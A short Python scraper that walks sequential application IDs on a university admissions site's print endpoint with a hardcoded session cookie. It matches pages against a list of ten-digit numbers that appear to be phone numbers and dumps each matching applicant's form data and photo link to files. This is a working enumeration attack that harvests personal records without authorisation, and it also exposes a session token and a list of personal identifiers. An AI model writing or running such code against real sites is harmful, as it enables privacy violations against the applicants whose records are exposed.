import requests
from bs4 import BeautifulSoup
import json
def data(id,user):
    db={'extra':[]}
    for i in range(len(tag)):
        try:
            db[tag[i].text.replace('*','')]
            db[tag[i].text.replace('*',str(i))]=tag[i].find_next_sibling('div').text
        except:
            db[tag[i].text.replace('*','')]=tag[i].find_next_sibling('div').text

    xdb=[]
    for i in range(len(tag2)):
        if i in [0,1,2]:
            name=tag2[12].find_all_next('tr')[0].text
            db['extra']=[db['extra'],tag2[12].find_all_next('tr')[i].text]
            # print(xdb)
        if i in [8,9,10]:
            db['extra']=[db['extra'],tag2[12].find_all_next('tr')[i].find_all_next('div')[1].text.replace(' ','').replace('\n','')]
    # db['extra']=xdb
    db['avatar']=img[0]['src']
    db['id']=id
    f=open(str(id)+'-'+user,'w')
    json.dump(db,f)
    f.close()

userList=[
  "6000437752",
  "6009873028",
  "6009970215",
  "6909087753",
  "7085920094",
  "7628910251",
  "7641038263",
  "7642932232",
  "9774394423",
  "8131930309",
  "8414077242",
  "8414821915",
  "8414893810",
  "8415949747",
  "8731969434",
  "8732084752",
  "8787582102",
  "8787698892",
  "8794345902",
  "8794430417",
  "8794920269",
  "8974521618",
  "8974924276",
  "9077782624",
  "9362065720",
  "9362547073",
  "9362917587",
  "9366847707",
  "9366919077",
  "9402103739",
  "9615842892",
  "9774287388",
  "9862563653",
  "9863839963"
]
r=requests
c=dict(PHPSESSID='8ajgk3df9i5ku2imtcba3sl56ii')
iterate=205130
userI=0
while (iterate != 205150):
    get=r.get("https://admissions.mlcuniv.in/apply/print/"+str(iterate),cookies=c)
    soup=BeautifulSoup(get.text,"html.parser")
    tag=soup.find_all ('label')
    tag2=soup.find_all ('table')
    img=soup.find_all ('img')
    print(iterate,get.text.find(userList[userI]),userList[userI])
    for i in range(len(userList)):
        find=get.text.find(userList[i])
        if find != -1:
            data(iterate,userList[i])
        
    iterate+=1
    userI+=1
